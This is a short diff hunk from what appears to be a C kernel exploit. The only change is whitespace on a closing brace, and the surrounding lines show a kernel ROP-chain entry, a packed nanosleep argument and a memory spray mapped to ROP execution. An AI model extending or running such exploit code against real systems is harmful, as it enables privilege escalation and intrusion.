@@ -328,7 +328,7 @@ int main() {
     enter_krop();
     nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL);
     break; // Successful exploit run ROP Chain
-}
+    }
     // Map spray to ROP execution
     char* spray_start = spray_bin;
     char* spray_stop = spray_end;
